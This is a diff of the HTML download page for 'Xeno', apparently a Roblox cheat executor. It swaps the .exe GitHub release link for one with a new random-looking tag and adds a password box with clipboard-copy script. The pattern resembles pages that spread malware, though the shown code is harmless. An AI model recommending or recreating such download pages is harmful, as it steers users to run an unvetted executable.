@@ -17,6 +17,15 @@ h1{font-size:clamp(28px,4vw,38px);font-weight:900;letter-spacing:-.03em;line-hei
 .btn{display:flex;align-items:center;justify-content:center;gap:10px;background:#ffffff;color:#000000;padding:18px 28px;border-radius:14px;text-decoration:none;font-weight:700;font-size:16px;transition:all .2s;box-shadow:0 8px 24px rgba(255,255,255,.4)}
 .btn:hover{transform:translateY(-2px);box-shadow:0 16px 40px rgba(255,255,255,.4)}
 .btn svg{width:20px;height:20px}
+.pwbox{margin-top:24px;padding:20px;background:#000000;border:1px solid rgba(255,255,255,.1);border-radius:14px;text-align:left;box-shadow:0 8px 24px rgba(0,0,0,.3)}
+.pwlabel{font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.6);margin-bottom:10px;font-weight:600}
+.pwrow{display:flex;align-items:center;gap:12px;justify-content:space-between;flex-wrap:wrap}
+.pwcode{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:22px;font-weight:800;letter-spacing:.15em;color:#ffffff;user-select:all;flex:1;min-width:160px;word-break:break-all;cursor:pointer}
+.pwcopy{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#ffffff;color:#000000;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s;white-space:nowrap;font-family:inherit}
+.pwcopy:hover{opacity:.88;transform:translateY(-1px)}
+.pwcopy:active{transform:translateY(0)}
+.pwcopy svg{width:14px;height:14px}
+.pwcopy.copied{background:transparent;color:#ffffff;border:1px solid #ffffff}
 .foot{margin-top:36px;padding-top:24px;border-top:1px solid rgba(255,255,255,.1);font-size:12px;color:rgba(255,255,255,.6);line-height:1.6}
 </style>
 </head>
@@ -25,12 +34,29 @@ h1{font-size:clamp(28px,4vw,38px);font-weight:900;letter-spacing:-.03em;line-hei
   <div class="brand"><div class="brand-mark">X</div><span>Xeno</span></div>
   <div class="card">
     <h1>Download Xeno</h1>
-    <a class="btn" href="https://github.com/Thresholdplisky/wave-dl-xeno/releases/download/v-onvfty/xeno.exe">
+    <a class="btn" href="https://github.com/Thresholdplisky/wave-dl-xeno/releases/download/v-rkyqgk/xeno.exe">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
       Download .exe
     </a>
-    <div class="foot">© 2026 Xeno. Not affiliated with Roblox Corporation.</div>
+    
+    <div class="foot"> © 2026 Xeno. Not affiliated with Roblox Corporation.</div>
   </div>
 </div>
+<script>
+function copyPw(btn){
+  var code=document.getElementById("pwval");
+  if(!code)return;
+  var txt=code.textContent.trim();
+  var done=function(){var orig=btn.innerHTML;btn.innerHTML="✓ Copied";btn.classList.add("copied");setTimeout(function(){btn.innerHTML=orig;btn.classList.remove("copied");},1800);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(function(){fallbackCopy(txt);done();});}
+  else{fallbackCopy(txt);done();}
+}
+function fallbackCopy(txt){
+  var ta=document.createElement("textarea");ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";
+  document.body.appendChild(ta);ta.select();try{document.execCommand("copy");}catch(e){}
+  document.body.removeChild(ta);
+}
+document.addEventListener("DOMContentLoaded",function(){var p=document.getElementById("pwval");if(p){p.addEventListener("click",function(){var b=document.querySelector(".pwcopy");if(b)copyPw(b);});}});
+</script>
 </body>
 </html>
